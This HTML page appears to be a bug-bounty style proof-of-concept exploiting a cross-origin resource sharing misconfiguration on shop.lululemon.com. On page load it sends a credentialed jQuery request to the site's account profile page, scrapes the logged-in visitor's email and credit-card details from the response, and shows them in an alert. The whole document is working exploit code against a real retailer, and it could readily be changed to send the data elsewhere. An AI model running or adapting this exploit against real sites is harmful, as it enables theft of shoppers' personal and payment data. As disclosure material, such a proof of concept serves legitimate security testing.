<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script type="text/javascript">
function aj() {
$.ajax({
    url : 'https://shop.lululemon.com/secure/account/profilelandingpage.jsp',
    type : 'GET',
    dataType:'html',
    success : function(data) {
	document.getElementById('test').innerHTML =  data;
	var email_id = 'not present'
	var card_detail = 'not present'
	
	var email = document.getElementsByClassName('profile-content')
	var card = document.getElementsByClassName('credit-card')
	
	if(email.length > 0) {
	    email_id = email[0].textContent
	}
	
	if(card.length > 0) {
	    card_detail = card[0].textContent
	}
	alert("Details fetched from shop.lululemon.com :) \n\nemail: " + email_id + "\ncard: "+ card_detail)
    },
    xhrFields: {
       withCredentials: true
    }
});
}

$( document ).ready(function() {
    aj();
});
</script>
	
</head>
<body>
<div id="test" hidden=true></div>
</body>
</html>
